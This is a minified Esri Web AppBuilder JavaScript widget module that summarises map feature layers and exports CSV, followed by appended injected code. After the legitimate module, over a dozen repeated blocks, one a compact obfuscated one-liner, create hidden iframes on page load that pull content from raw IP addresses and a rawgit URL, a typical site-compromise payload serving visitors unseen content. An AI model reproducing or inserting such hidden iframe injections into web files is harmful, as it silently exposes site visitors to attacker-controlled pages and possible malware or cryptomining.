// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/Evented dojo/_base/array dojo/DeferredList dojo/Deferred dojo/_base/lang dojo/_base/Color dojo/dom dojo/dom-class dojo/dom-construct dojo/dom-geometry dojo/dom-style dojo/number dojo/on dojo/has dijit/form/Button jimu/dijit/Popup jimu/utils jimu/dijit/Message esri/config esri/geometry/geometryEngine esri/geometry/mathUtils esri/geometry/Point esri/geometry/webMercatorUtils esri/graphic esri/layers/FeatureLayer esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/Font esri/symbols/TextSymbol esri/tasks/query ./analysisUtils".split(" "),
function(A,B,w,x,t,n,F,G,q,r,H,I,C,u,J,K,L,D,y,M,N,O,P,Q,E,v,R,S,T,U,z,p){return A("SummaryInfo",[B],{summaryLayer:null,summaryFields:[],summaryIds:[],summaryFeatures:[],tabNum:null,symbolField:null,graphicsLayer:null,lyrRenderer:null,lyrSymbol:null,featureCount:0,mapServiceLayer:!1,loading:!1,queryOnLoad:!1,incidentCount:0,allFields:!1,constructor:function(a,d,g){this.tab=a;this.container=d;this.parent=g;this.config=g.config;this.graphicsLayer=null;this.baseLabel=""!==a.label?a.label:a.layerTitle?
a.layerTitle:a.layers},queryTabCount:function(a,d,g,c){var k=new t;this.incidentCount=a.length;var f=[this.tab.tabLayers[0]];this.mapServiceLayer&&1<this.tab.tabLayers.length&&(f=[this.tab.tabLayers[1]]);if(0<this.tab.tabLayers.length&&this.tab.tabLayers[0].url&&-1<this.tab.tabLayers[0].url.indexOf("MapServer")){this.mapServiceLayer=!0;var b;"undefined"!==typeof this.tab.tabLayers[0].infoTemplate?(this.summaryLayer=this.tab.tabLayers[0],this.summaryLayer.hasOwnProperty("loaded")&&this.summaryLayer.loaded?
(this.summaryFields=this._getFields(this.summaryLayer),this._performQuery(a,d,g,c,f).then(function(a){k.resolve(a)})):(b=new v(this.summaryLayer.url),b.infoTemplate=this.tab.tabLayers[0].infoTemplate,f=[b],this.tab.tabLayers=f,u(b,"load",n.hitch(this,function(){this.summaryLayer=b;this.summaryFields=this._getFields(this.summaryLayer);this._performQuery(a,d,g,c,f).then(function(a){k.resolve(a)})})))):this.loading||(b=new v(this.tab.tabLayers[0].url),this.loading=!0,u(b,"load",n.hitch(this,function(){this.summaryLayer=
b;this.summaryFields=this._getFields(this.summaryLayer);for(var h=this.tab.tabLayers[0].url.split("MapServer/")[1],e=this.parent.map.itemInfo.itemData.operationalLayers,l=0;l<e.length;l++){var m=e[l];if("undefined"!==typeof m.layerObject)if(m.layerObject.infoTemplates){if(m=m.layerObject.infoTemplates[h]){b.infoTemplate=m.infoTemplate;break}}else if(m.layerObject.infoTemplate){b.infoTemplate=m.layerObject.infoTemplate;break}}f=[b];this.tab.tabLayers=f;this.loading=!1;this._performQuery(a,d,g,c,f).then(function(a){k.resolve(a)})})))}this.mapServiceLayer||
this._performQuery(a,d,g,c,f).then(function(a){k.resolve(a)});return k},_performQuery:function(a,d,g,c,k){var f=new t,b=[],h,e;0<d.length?e=p.getGeoms(d):0<a.length&&(e=p.getGeoms(a));this.summaryGeoms=e;if(0<e.length)for(a=0;a<e.length;a++)b=e[a],d=p.createDefArray(k,b),h=0===a?b=d:b=h.concat(d);(new x(b)).then(n.hitch(this,function(a){for(var e=0,b=0;b<a.length;b++){var d=a[b][1];isNaN(d)?d&&d.features?e+=d.features.length:d&&"undefined"!==typeof d.length&&(e+=d.length):e+=d}this.updateTabCount(e,
g,c);this.queryOnLoad&&n.hitch(this,this._queryFeatures(this.summaryGeoms));f.resolve(e)}));return f},updateTabCount:function(a,d,g){this.featureCount=a;p.updateTabCount(this.featureCount,d,g,this.baseLabel,this.incidentCount)},updateForIncident:function(a,d,g,c,k,f,b){this.incidentCount=a.length;this.allFields="undefined"!==typeof f&&"undefined"!==typeof b?f?!0:b:!1;var h="undefined"!==typeof k,e;this.tabNum=c;h?e=new t:(this.container.innerHTML="",q.add(this.container,"loading"));this.summaryIds=
[];this.summaryFeatures=[];if(0<this.tab.tabLayers.length){var l=this.summaryGeoms,m;"undefined"!==typeof this.tab.tabLayers[0].infoTemplate?(this.summaryLayer=this.tab.tabLayers[0],m=new v(this.summaryLayer.url),m.infoTemplate=this.tab.tabLayers[0].infoTemplate,this.tab.tabLayers[1]=m,this.summaryFields=this._getFields(this.tab.tabLayers[0]),h?this._queryFeatures(l,h).then(function(a){e.resolve(a)}):(this._initGraphicsLayer(g),n.hitch(this,this._queryFeatures(l)))):(m=new v(this.tab.tabLayers[0].url),
u(m,"load",n.hitch(this,function(){this.summaryLayer=m;if(-1<this.tab.tabLayers[0].url.indexOf("MapServer"))for(var a=this.tab.tabLayers[0].url.split("MapServer/")[1],b=this.parent.map.itemInfo.itemData.operationalLayers,c=0;c<b.length;c++){var d=b[c];if("undefined"!==typeof d.layerObject&&d.layerObject.infoTemplates&&(d=d.layerObject.infoTemplates[a])){m.infoTemplate=d.infoTemplate;break}}this.tab.tabLayers[1]=m;this.summaryFields=this._getFields(this.tab.tabLayers[1]);h?this._queryFeatures(l,h).then(function(a){e.resolve(a)}):
(this._initGraphicsLayer(g),n.hitch(this,this._queryFeatures(l)))})));if(h)return e}},_initGraphicsLayer:function(a){null!==a&&(this.graphicsLayer=a,this.graphicsLayer.clear(),this.summaryLayer&&this.summaryLayer.renderer&&(this.lyrRenderer=this.summaryLayer.renderer,this.graphicsLayer.renderer=this.lyrRenderer,"undefined"!==typeof this.summaryLayer.renderer.attributeField?this.symbolField=this.summaryLayer.renderer.attributeField:this.lyrSymbol=this.lyrRenderer.symbol))},_queryFeatures:function(a,
d){var g;d&&(g=new t);var c=[],k=this.tab.tabLayers[0].id,f="";this.parent.opLayers.traversal(function(a){if(k===a.id&&a.getFilter())return f=a.getFilter(),!0});for(var b=new z,h=0;h<a.length;h++)b.geometry=a[h],b.where=f,c.push(this.summaryLayer.queryIds(b));(new x(c)).then(n.hitch(this,function(a){for(var b,c,e=0;e<a.length;e++)a[e][0]&&(b=a[e][1],c=b=0===e?b:c.concat(b));b?(this.summaryIds=b,0<this.summaryIds.length?d?this._queryFeaturesByIds(d).then(function(a){g.resolve(a)}):this._queryFeaturesByIds():
d||this._processResults()):d||this._processResults()}),n.hitch(this,function(a){console.error(a);new y({message:a})}));if(d)return g},_queryFeaturesByIds:function(a){var d,g=[];a&&(d=new t);var c=this.summaryLayer.maxRecordCount||1E3,k=this.summaryIds.slice(0,c);this.summaryIds.splice(0,c);var f=new z,b=!1;w.some(this.summaryFields,n.hitch(this,function(a){if("area"===a.type||"length"===a.type||this.graphicsLayer)return b=!0}));a&&(b=!0);f.returnGeometry=b;f.outSpatialReference=this.parent.map.spatialReference;
var h=[];w.forEach(this.summaryFields,function(a){h.push(a.field)});this.symbolField&&h.push(this.symbolField);f.outFields=!0===this.config.csvAllFields||"true"===this.config.csvAllFields?["*"]:h;f.objectIds=k;for(g.push(this.summaryLayer.queryFeatures(f));0<this.summaryIds.length;)k=this.summaryIds.slice(0,c),this.summaryIds.splice(0,c),f.objectIds=k,g.push(this.summaryLayer.queryFeatures(f));(new x(g)).then(n.hitch(this,function(b){for(var c=0;c<b.length;c++)if(b[c][0]){var e=b[c][1];e.features&&
(this.summaryFeatures=this.summaryFeatures.concat(e.features))}a?this._processResults(a).then(n.hitch(this,function(a){this.SA_SAT_download&&q.replace(this.SA_SAT_download,"download","processing");d.resolve(a)})):(this._processResults(),this.SA_SAT_download&&q.replace(this.SA_SAT_download,"download","processing"));this.SA_SAT_download&&q.replace(this.SA_SAT_download,"download","processing")}),n.hitch(this,function(a){console.error(a);new y({message:a})}));if(a)return d},_prepResults:function(){for(var a=
0;a<this.summaryFields.length;a++){var d=this.summaryFields[a],g=d.field,c=d.total;switch(d.type){case "count":c=this.summaryFeatures.length;break;case "area":c=p.getArea(this.summaryFeatures,this.summaryGeoms,this.config.distanceSettings,this.config.distanceUnits);break;case "length":c=p.getLength(this.summaryFeatures,this.summaryGeoms,this.config.distanceSettings,this.config.distanceUnits);break;case "sum":c=p.getSum(this.summaryFeatures,g);break;case "avg":c=p.getSum(this.summaryFeatures,g)/this.summaryFeatures.length;
break;case "min":c=p.getMin(this.summaryFeatures,g);break;case "max":c=p.getMax(this.summaryFeatures,g)}d.total=c}},_processResults:function(a){this._prepResults();var d,g=this.summaryFields,c=0,k;if(a)d=new t;else{this.container.innerHTML="";q.remove(this.container,"loading");if(0===this.summaryFeatures.length){this.container.innerHTML=this.parent.nls.noFeaturesFound;return}k=r.create("div",{style:"width:"+220*(g.length+1)+"px;"},this.container);q.add(k,"SAT_tabPanelContent");var f=r.create("div",
{},k);q.add(f,"SATcolExport");q.add(f,this.parent.lightTheme?"lightThemeBorder":"darkThemeBorder");f=r.create("div",{"data-dojo-attach-point":"SA_SAT_download",title:this.parent.nls.downloadCSV},f);q.add(f,[this.parent.isBlackTheme?"btnExportBlack":"btnExport","download"]);u(f,"click",n.hitch(this,this._exportToCSV,g))}for(var f=[],b=0;b<g.length;b++){var h=g[b],e=D.stripHTML(h.alias?h.alias:"")+"\x3cbr/\x3e",c=h.alias===this.parent.nls.area||h.alias===this.parent.nls.length?h.total:Math.round(h.total);
isNaN(c)&&(c=0);h=C.format(c);if(a)f.push({num:h,info:e,total:c});else{c=r.create("div",{"class":"SATcol"},k);q.add(c,this.parent.lightTheme?"lightThemeBorder":"darkThemeBorder");var l=r.create("div",{style:"max-height: 60px;"},c);r.create("div",{"class":" SATcolWrap",style:"max-height: 30px; overflow: hidden;",innerHTML:e},l);r.create("div",{"class":" colSummary",innerHTML:h},c)}}g=[];k=null!==this.graphicsLayer;!a&&k&&(this.graphicsLayer.clear(),this.tab.tabLayers[1].clear());if(this.summaryFeatures)for(b=
0;b<this.summaryFeatures.length;b++)e=this.summaryFeatures[b],this.lyrSymbol?e.symbol=this.lyrSymbol:k&&this.graphicsLayer.renderer?(h=this.graphicsLayer.renderer.getSymbol(e),e.symbol=h):this.summaryLayer.renderer&&this.summaryLayer.renderer.getSymbol&&(e.symbol=this.summaryLayer.renderer.getSymbol(e)),e=e.toJson?new E(e.toJson()):e,!a&&k?(this.graphicsLayer.add(e),this.tab.tabLayers[1].add(e)):g.push(e);!a&&k&&(this.graphicsLayer.setVisibility(!0),this.parent._toggleTabLayersNew(this.tabNum),this.tab.restore&&
this.emit("summary-complete",{bubbles:!0,cancelable:!0,tab:this.tabNum}));if(a)return d.resolve({graphics:g,analysisResults:f,context:this}),d},_exportToCSV:function(a,d,g,c){a=p.exportToCSV(this.summaryFeatures,d,g,c,{type:"summary",baseLabel:this.baseLabel,csvAllFields:this.parent.config.csvAllFields,layer:this.summaryLayer,opLayers:this.parent.opLayers,nlsValue:this.parent.nls.summary,nlsCount:this.parent.nls.count,summaryFields:this.summaryFields,calcFields:this.calcFields});this.summaryLayer=
a.summaryLayer;return a.details},_getFields:function(a){var d=p.getSkipFields(a),g=[];if("undefined"!==typeof this.tab.advStat){var c=this.tab.advStat.stats,k;for(k in c)0<c[k].length&&w.forEach(c[k],function(a){g.push({field:a.expression,alias:a.label+"",type:k,total:0})})}else{if(a.infoTemplate)c=a.infoTemplate.info.fieldInfos;else if(-1<this.tab.tabLayers[0].url.indexOf("MapServer"))for(var f=this.tab.tabLayers[0].url.split("MapServer/")[1],b=this.parent.map.itemInfo.itemData.operationalLayers,
c=null,h=0;h<b.length;h++){var e=b[h];if(e.layerObject.infoTemplates&&(e=e.layerObject.infoTemplates[f])){c=e.infoTemplate.info.fieldInfos;break}}else c=a.fields;c||(c=a.fields);for(f=0;f<c.length;f++)if(b=c[f],"undefined"!==typeof a.fields){var h=a.fields[f].type,l;b.name===a.objectIdField||"esriFieldTypeDouble"!==h&&"esriFieldTypeInteger"!==h&&"esriFieldTypeSmallInteger"!==h||("undefined"!==typeof b.visible?b.visible&&(l={field:b.fieldName,alias:b.label,type:"sum",total:0}):l={field:b.name,alias:b.alias,
type:"sum",total:0},l&&-1===d.indexOf(l.field)&&g.push(l),l=null)}}this.calcFields=n.clone(g);if(this.allFields)for(c=0;c<a.fields.length;c++){l=a.fields[c];f=!0;b=0;b:for(;b<g.length;b++)if(l.name===g[b].field){f=!1;break b}-1===d.indexOf(l.name)&&f&&g.push({field:l.name,alias:l.alias,type:l.type})}a=p.getSpecialFields(a);this.dateFields=a.dateFields;this.specialFields=a.specialFields;this.typeIdField=a.typeIdField;this.types=a.types;return g}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});